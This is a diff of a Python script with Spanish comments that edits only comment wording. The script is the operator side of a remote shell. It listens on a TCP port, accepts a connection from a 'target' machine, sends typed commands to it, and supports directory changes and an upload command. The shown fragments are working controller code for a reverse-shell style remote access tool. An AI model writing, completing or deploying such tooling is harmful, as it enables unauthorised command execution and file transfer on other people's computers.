@@ -11,7 +11,7 @@ def sv():
     global target
     servidor = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Configura el servidor para IPv4 y TCP
     servidor.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # Configura servidor para usar únicamente socket y que se pueda reusar la dirección
-    servidor.bind(("192.168.0.19", 1608))  # IP (cambiar) y puerto (Mi cumple XD)
+    servidor.bind(("192.168.0.19", 1608))  # IP (cambiar) y puerto
     servidor.listen(1)  # Acepta una única conexión
     print("Servidor andando y esperando conexiones...")
     target, ip = servidor.accept()
@@ -24,12 +24,12 @@ def shell():
         comando = input(directorio.decode()+"~$: ")  # Printea el directorio formateado y pasado a string
         if comando == "exit":
             break
-        elif comando[:2] == "cd":  # Caso especial pk se chingaba con el cd, haciendo que cambie de directorio por python
+        elif comando[:2] == "cd":  # Caso especial porque se caía con el cd, haciendo que cambie de directorio por python
             target.send(comando.encode())
             res = target.recv(2048)
             directorio = res
             print(res.decode())
-        elif comando == "":  # Para que no se chingue con un enter
+        elif comando == "":  # Para que no se caiga con un enter
             pass
         elif comando[:5] == "subir":
             try:
